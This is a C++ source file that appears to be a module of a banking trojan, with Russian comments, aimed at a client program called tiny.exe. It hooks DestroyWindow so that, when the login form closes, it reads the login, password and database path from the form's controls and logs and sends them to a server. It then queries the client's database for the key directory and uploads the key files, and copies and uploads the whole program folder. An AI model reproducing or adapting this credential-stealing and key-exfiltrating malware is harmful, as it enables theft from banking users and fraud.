#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "modules.h"
#include "Plugins.h"
#include "rafa.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotCore.h"
#include "StrConsts.h"
#include "Splice.h"
#include "Unhook.h"
#include <shlwapi.h>
#include <shlobj.h>
#include "odbc.h"

#include "BotDebug.h"

namespace TINYCLIENT
{
	#include "DbgTemplates.h"
}

#define DBG TINYCLIENT::DBGOutMessage<>

namespace Tiny
{

const int PROCESS_HASH = 0x9530DB12; // tiny.exe
const DWORD HashTfAuthNew = 0x19DEB558; //класс окна входа в систему

char folderTiny[MAX_PATH];

//контролы с которых нужно забрать текст в форме регистрации
DWORD GrabControls[] = { 0x79770896 /* TComboBox */, 0x48B934F1 /* TEdit */, 0 };
const int MaxFindedControl = 3;
static char pathMDB[MAX_PATH]; //путь к базе данных

struct ForFindControl
{
	HWND wnds[MaxFindedControl];
	char* texts[MaxFindedControl];
	int count;
	DWORD* hashs;
};

BOOL (WINAPI *RealDestroyWindow)( HWND hWnd );

static bool SetHooks();
static bool InitData();

static void CloseDB( ODBC* DB )
{
	if( DB ) delete DB;
}

static ODBC* OpenDB()
{
	ODBC* DB = new ODBC();
	if( DB )
	{
		char strConnect[MAX_PATH];
		m_lstrcpy( strConnect, "DRIVER=Microsoft Access Driver (*.mdb);DBQ=" );
		m_lstrcat( strConnect, pathMDB );
//		m_lstrcat( strConnect, ";UID=admin;PWD=" );
		DBG( "Tiny", "strConnect: '%s'", strConnect );
		if( !DB->Connect(strConnect) )
		{
			CloseDB(DB);
			DB = 0;
		}
	}
	return DB;
}


//отсылка полного клиента на видео сервер
DWORD WINAPI SendTiny(LPVOID)
{
	BOT::Initialize(ProcessUnknown);
	DBG( "Tiny", "запуск отсылки программы на сервер из папки %s", folderTiny );
//	DWORD folderSize = 0;
//	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
//	{
//		DBG( "Tiny", "Папка программы больше заданного размера, не копируем" );
//		return 0;
//	}
//	DBG( "Tiny", "Размер папки %d байт", folderSize );
	char tempFolder[MAX_PATH], clientPrg[MAX_PATH];
	m_memcpy( clientPrg, "tiny_client\\", 12 );
	PathToName( folderTiny, clientPrg + 12, sizeof(clientPrg) - 12 );
	pGetTempPathA( sizeof(tempFolder), tempFolder );
	char* cryptName = UIDCrypt::CryptFileName( clientPrg + 12, false );
	pPathAppendA( tempFolder, cryptName );
	STR::Free(cryptName);
	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
	{
		DBG( "Tiny", "Эта папка на данный момент выкачивается" );
		return 0;
	}
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
	pCreateDirectoryA( tempFolder, 0 );
	DBG( "Tiny", "Копирование во временную папку %s", tempFolder );
	*((int*)&(folderTiny[ m_lstrlen(folderTiny) ])) = 0; 
	CopyFileANdFolder( folderTiny, tempFolder );
	DBG( "Tiny", "Копирование на сервер" );
	//удаляем ненужные папки
/*
	const char* DelFolders[] = { "DATA", "OldVersion", 0 };
	int i = 0;
	while( DelFolders[i] )
	{
		pPathAppendA( tempFolder, DelFolders[i] );
		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
		DBG( "Tiny", "Удаление папки %s", tempFolder );
		DeleteFolders(tempFolder);
		pPathRemoveFileSpecA(tempFolder);
		i++;
	}
*/
	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
	DeleteFolders(tempFolder);
	DBG( "Tiny", "Копирование на сервер окончено" );
	return 0;
}

static bool IsHash( DWORD* hashs, DWORD hash )
{
	while( *hashs )
	{
		if( *hashs == hash )
			return true;
		hashs++;
	}
	return false;
}

static void AddStrLog( const char* name, const char* value, char* resultGrab )
{
	char buf[MAX_PATH];
	m_lstrcpy( buf, name );
	m_lstrcat( buf, ": " );
	if( value )
		m_lstrcat( buf, value );
	if( resultGrab[0] ) m_lstrcat( resultGrab, ", " );
	m_lstrcat( resultGrab, buf );
	m_lstrcat( buf, "\r\n" );
	KeyLogger::AddStrToBuffer( 0, buf, 0 );
	DBG( "Tiny", buf );
}

static DWORD SendGrabData( ForFindControl* ffc )
{
	TMemory resultGrab(512);
	resultGrab.AsStr()[0] = 0;
	AddStrLog( "Login", ffc->texts[0], resultGrab.AsStr() );
	AddStrLog( "Password", ffc->texts[2], resultGrab.AsStr() );
	AddStrLog( "Path database", ffc->texts[1], resultGrab.AsStr() );
	AddStrLog( "Path client", folderTiny, resultGrab.AsStr() );
	m_lstrcpy( pathMDB, ffc->texts[1] );
	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
	MemFree(ffc);
	//берем в базе данных путь к ключам
	ODBC* db = OpenDB();
	if( db )
	{
		char pathKeys[MAX_PATH];
		pathKeys[0] = 0;
		const char* sql = "select Param from Config where Code='keypath'";
		SQLHSTMT qr = db->ExecuteSql( sql, "os255", pathKeys );
		if( qr )
		{
			db->CloseQuery(qr);
			DBG( "Tiny", "Путь к ключам '%s'", pathKeys );
			KeyLogger::AddDirectory( pathKeys, "keys" );
			VideoProcess::SendFiles( 0, "keys_tiny", pathKeys, 0, true );
		}
		else
			DBG( "Tiny", "Путь к ключам в базе данных не найден" );
		CloseDB(db);
	}
	else
		DBG( "Tiny", "Не удалось открыть базу %s", pathMDB );

	pSleep(10000); //ждем немного и закрываем систему

	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };	
	RestoreFuncs( DLL_USER32,  unhook );

	KeyLogger::CloseSession();

	return 0;
}

static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
{
	ForFindControl* ffc = (ForFindControl*)lParam;
	DWORD hash = GetWndClassHash(hwnd);
	if( IsHash( ffc->hashs, hash ) )
	{
		ffc->wnds[ffc->count] = hwnd;
		ffc->texts[ffc->count] = GetWndText(hwnd);
		DBG( "Tiny", "find control %08x, text = %s", hwnd, ffc->texts[ffc->count] );
		ffc->count++;
		if( ffc->count >= MaxFindedControl ) return FALSE;
	}
	return TRUE;
}

/////////////////////////////////////////////////////////////////////
// Хуки
/////////////////////////////////////////////////////////////////////

static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
{
	DWORD hash = GetWndClassHash(hwnd);
	if( HashTfAuthNew == hash )
	{
		DBG( "Tiny", "Закрытие окна регистрации" );
		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
		ffc->count = 0;
		ffc->hashs = GrabControls;
		pEnumChildWindows( hwnd, EnumChildProc, ffc );
		if( ffc->count >= 3 )
			RunThread( SendGrabData, ffc );
	}
	return RealDestroyWindow(hwnd);
}

///////////////////////////////////////////////////////////////////////////////

//активация при регистариции
void Activeted(LPVOID Sender)
{
	DBG( "Tiny", "Activated" );
	PKeyLogSystem System = (PKeyLogSystem)Sender;
	MegaJump(SendTiny);
	VideoProcess::RecordPID( 0, "Tiny" );
	SetHooks();
}

bool Init( const char* appName )
{
	PKeyLogSystem S = KeyLogger::AddSystem( "tiny", PROCESS_HASH );
	if( S != NULL )
	{
		DBG( "Tiny", "Регистрация системы" );
		m_lstrcpy( folderTiny, appName );
		pPathRemoveFileSpecA(folderTiny); //папка с прогой
		S->MakeScreenShot = true;
		S->SendLogAsCAB = true;
		char* classWnd = "TfAuthNew";
		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, classWnd, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
		if( F1 )
		{
			F1->OnActivate = Activeted;
		}
		return true;
	}
	return false;
}

static bool SetHooks()
{
	if( HookApi( DLL_USER32, 0xEB4A6DB3 /* DestroyWindow */, &HandlerDestroyWindow, &RealDestroyWindow ) )
	{
		DBG( "Tiny", "установили хук на DestroyWindow" );
	}
	return true;
}

static bool InitData()
{
	pathMDB[0] = 0;
//	if( GetAdminUrl(domain) == 0 )
//		domain[0] = 0;
	return true;
}

}
